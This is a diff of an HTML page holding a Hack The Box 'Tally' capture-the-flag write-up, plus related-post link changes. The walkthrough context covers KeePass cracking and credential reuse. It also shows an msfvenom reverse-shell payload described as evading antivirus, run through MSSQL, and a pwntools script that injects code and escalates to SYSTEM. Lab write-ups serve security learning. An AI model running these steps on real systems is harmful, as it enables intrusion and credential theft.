@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.38.2" />
+<meta name="generator" content="Hugo 0.78.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -155,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https://alamot.github.io/"
+      "@id":"https:\/\/alamot.github.io\/"
     },
     "headline": "Tally write-up |  ",
     "image": {
@@ -169,14 +169,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
-      "image": "https://alamot.github.io/images/logo.png"
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https://alamot.github.io/images/logo.png",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -314,7 +314,7 @@ if (language) {
 <h2 id="port-scanning">Port scanning</h2>
 
 <p>Let&rsquo;s scan the full range of TCP ports using my tool htbscan.py (you can find it here: <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py):" target="_blank">https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py):</a>
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo ./htbscan.py 10.10.10.59 300
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo ./htbscan.py 10.10.10.59 300
 
 Running command: sudo masscan -e tun0 -p0-65535 --max-rate 300 --interactive 10.10.10.59
 
@@ -433,14 +433,14 @@ Host script results:
 |_    Message signing enabled but not required
 | smb2-time: 
 |   date: 2018-05-03 15:12:36
-|_  start_date: 2018-05-03 13:47:08</code></pre></div></div></p>
+|_  start_date: 2018-05-03 13:47:08</code></pre></div></p>
 
 <h2 id="brute-forcing-microsoft-sharepoint">Brute forcing Microsoft SharePoint</h2>
 
 <p>We see that Microsoft SharePoint is on the box. Let&rsquo;s download the SharePointURLBrute tool from here:
 <a href="https://www.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/" target="_blank">https://www.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/</a></p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ perl SharePointURLBrute\ v1.1.pl  -a http://10.10.10.59 -e SharePoint-UrlExtensions-18Mar2012.txt
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ perl SharePointURLBrute\ v1.1.pl  -a http://10.10.10.59 -e SharePoint-UrlExtensions-18Mar2012.txt
 
 Starting search for common SharePoint Pages
 Start Time: Sun Nov  5 11:37:15 2017
@@ -478,7 +478,7 @@ FOUND: http://10.10.10.59/_vti_bin/SharepointEmailWS.asmx
 FOUND: http://10.10.10.59/_vti_bin/spsearch.asmx
 FOUND: http://10.10.10.59/_vti_bin/WebPartPages.asmx
 FOUND: http://10.10.10.59/default.aspx
-FOUND: http://10.10.10.59/shared documents/forms/allitems.aspx</code></pre></div></div>
+FOUND: http://10.10.10.59/shared documents/forms/allitems.aspx</code></pre></div>
 
 <h2 id="getting-ftp-credentials">Getting FTP credentials</h2>
 
@@ -518,21 +518,21 @@ encrypted share creds:
 password in keepass</code></pre></div></p>
 
 <p>Let&rsquo;s download /User/Tim/Files/tim.kdbx and crack it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">keepass2john tim.kdbx &gt; hash
+<div class="bg-black"><pre><code class="language-console" data-lang="console">keepass2john tim.kdbx &gt; hash
 john --format=KeePass --wordlist=/usr/share/dict/rockyou.txt hash
-tim:simplementeyo</code></pre></div></div></p>
+tim:simplementeyo</code></pre></div></p>
 
 <p>Now open tim.kbdx using keepass (Master password: simplementeyo)
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ keepass tim.kbdx</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ keepass tim.kbdx</code></pre></div></p>
 
 <p>Go to Database -&gt; WORK -&gt; WINDOWS -&gt; Shares. Here, we found some SMB credentials Finance:Acc0unting (right click and copy password to get the password)</p>
 
 <h2 id="getting-mssql-credentials">Getting MSSQL credentials</h2>
 
 <p>Let&rsquo;s connect to SMB:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ smbclient -U Finance \\\\10.10.10.59\\ACCT</code></pre></div></div>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ smbclient -U Finance \\\\10.10.10.59\\ACCT</code></pre></div>
 or
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo mount -t cifs //10.10.10.59/ACCT /mnt/TEMP -o,user=Finance,password=Acc0unting,vers=2.0</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo mount -t cifs //10.10.10.59/ACCT /mnt/TEMP -o,user=Finance,password=Acc0unting,vers=2.0</code></pre></div></p>
 
 <p>Inside the smb:\zz_Migration\Binaries\new Folder\tester.exe we find this:
 <div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;</code></pre></div></p>
@@ -542,10 +542,10 @@ or
 <h2 id="getting-shell">Getting shell</h2>
 
 <p>Let&rsquo;s make a meterpreter payload using msfvenom. If we use the <strong>psh-reflection</strong> format our payload invade the antivirus detection:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.105 LPORT=60000 -f psh-reflection -o msf.ps1</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.105 LPORT=60000 -f psh-reflection -o msf.ps1</code></pre></div></p>
 
 <p>Don&rsquo;t forget to set up your listener using exploit/multi/handler:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">msf&gt; use exploit/multi/handler
+<div class="bg-black"><pre><code class="language-console" data-lang="console">msf&gt; use exploit/multi/handler
 msf exploit(handler) &gt; options
 
 Module options (exploit/multi/handler):
@@ -559,10 +559,10 @@ Payload options (windows/x64/meterpreter/reverse_tcp):
    LPORT     60000            yes       The listen port
 
 msf exploit(handler) &gt; exploit
-[*] Started reverse TCP handler on 127.0.0.1:6000</code></pre></div></div></p>
+[*] Started reverse TCP handler on 127.0.0.1:6000</code></pre></div></p>
 
 <p>Now, upload msf.ps1 to /Intranet via FTP. We can execute our payload via MSSQL:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfconsole
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ msfconsole
 msf&gt; use  auxiliary/admin/mssql/mssql_exec
 msf auxiliary(mssql_exec) &gt; set CMD &#34;powershell -ExecutionPolicy bypass -NoExit -File C:\\FTP\\Intranet\\msf.ps1&#34;
 msf auxiliary(mssql_exec) &gt; info
@@ -578,23 +578,23 @@ Basic options:
   USERNAME         sa
   USE_WINDOWS_AUTH false
 
-msf auxiliary(mssql_exec) &gt; exploit</code></pre></div></div></p>
+msf auxiliary(mssql_exec) &gt; exploit</code></pre></div></p>
 
 <p>And here is our meterpreter shell:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">meterpreter &gt; sysinfo
+<div class="bg-black"><pre><code class="language-console" data-lang="console">meterpreter &gt; sysinfo
 Computer        : TALLY
 OS              : Windows 2016 (Build 14393).
 Architecture    : x64
 System Language : en_GB
 Domain          : HTB.LOCAL
 Logged On Users : 7
-Meterpreter     : x64/windows</code></pre></div></div></p>
+Meterpreter     : x64/windows</code></pre></div></p>
 
 <h1 id="privilege-escalation">Privilege Escalation</h1>
 
 <h2 id="using-incognito-and-rottenpotato">Using Incognito and RottenPotato</h2>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">meterpreter &gt; getprivs
+<div class="bg-black"><pre><code class="language-console" data-lang="console">meterpreter &gt; getprivs
 ============================================================
 Enabled Process Privileges
 ============================================================
@@ -662,7 +662,7 @@ Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
 
 C:\Users\Sarah\Desktop&gt; whoami
-nt authority\system :D</code></pre></div></div>
+nt authority\system :D</code></pre></div>
 
 <h2 id="using-cve-2017-213">Using CVE-2017-213</h2>
 
@@ -799,7 +799,7 @@ or
 <span class="n">ps1</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT1</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
 <span class="k">if</span> <span class="n">ps1</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
     <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 <span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
 <span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;. .</span><span class="se">\\</span><span class="s2">Invoke-PSInject.ps1&#34;</span><span class="p">)</span>
 <span class="n">ps1</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;Invoke-PSInject -ProcName sihost -PoshCode &#34;</span><span class="o">+</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload2</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;UTF-16LE&#39;</span><span class="p">)))</span>
@@ -807,7 +807,7 @@ or
 <span class="n">ps2</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT2</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
 <span class="k">if</span> <span class="n">ps2</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
     <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 <span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;copy C:</span><span class="se">\\</span><span class="s2">FTP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">FTP_UPLOADPATH</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">cve2017213ps.exe C:</span><span class="se">\\</span><span class="s2">TEMP</span><span class="se">\\</span><span class="s2">cve2017213ps.exe&#34;</span><span class="p">)</span>
 <span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cd C:</span><span class="se">\\</span><span class="s2">TEMP</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span>
 <span class="n">ps2</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;. .</span><span class="se">\\</span><span class="s2">cve2017213ps.exe&#34;</span><span class="p">)</span>
@@ -815,13 +815,13 @@ or
 <span class="n">ps3</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT3</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="n">TIMEOUT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
 <span class="k">if</span> <span class="n">ps3</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
     <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 <span class="n">ps3</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
-<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span></code></pre></div></p>
+<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span></code></pre></div></p>
 
 <p>Here is the output:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[*] LHOST = 10.10.15.247
+<div class="bg-black"><pre><code class="language-console" data-lang="console">[*] LHOST = 10.10.15.247
 [+] Trying to bind to 0.0.0.0 on port 60000: Done
 [+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.59 on port 50143
 [+] Successful login at ftp server 10.10.10.59 with username &#39;ftp_user&#39; and password &#39;UTDRSCH53c&#34;$6hys&#39;
@@ -839,24 +839,24 @@ or
 [*] Switching to interactive mode
 $ whoami
 nt authority\system
-PS C:\Windows\system32$</code></pre></div></div></p>
+PS C:\Windows\system32$</code></pre></div></p>
 
 <h1 id="what-about-exploiting-firefox">What about exploiting Firefox</h1>
 
 <p>On the box, there is Firefox version 44.0.2 and a script automatically opens C:\FTP\Intranet\index.html every now and then:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">C:\Users\Sarah\Desktop&gt; type browser.bat
+<div class="bg-black"><pre><code class="language-console" data-lang="console">C:\Users\Sarah\Desktop&gt; type browser.bat
 ...
 REM copy latest mockups to webroot
 copy /Y C:\FTP\Intranet\index.html C:\inetpub\wwwroot\HRTJYKYRBSHYJ\index.html
 
 REM browse file
 start &#34;&#34; &#34;C:\Program Files (x86)\Mozilla Firefox\Firefox.exe&#34; &#34;http://127.0.0.1:81/HRTJYKYRBSHYJ/index.html&#34;
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>In theory, we could exploit it by uploading an evil index.html via the FTP.
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ searchsploit firefox 44.0.2 -w
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ searchsploit firefox 44.0.2 -w
 
-Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.com/exploits/44294/</code></pre></div></div></p>
+Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.com/exploits/44294/</code></pre></div></p>
 
 <p>Unfortunately, I was not able to make it work. I even enabled RDP on the box and I connected to check what is going on. The exploit is opened normally but the firefox either crashes or it doesn&rsquo;t execute the payload properly.</p>
 
@@ -908,21 +908,17 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
            
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
     </footer>
   </a>
 </article>
@@ -936,129 +932,17 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1081,260 +965,20 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1428,17 +1072,21 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
            
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1460,21 +1108,17 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
            
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
     </footer>
   </a>
 </article>
@@ -1492,113 +1136,21 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1684,21 +1236,185 @@ Firefox 44.0.2 - ASM.JS JIT-Spray Remote Code Execution https://www.exploit-db.c
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
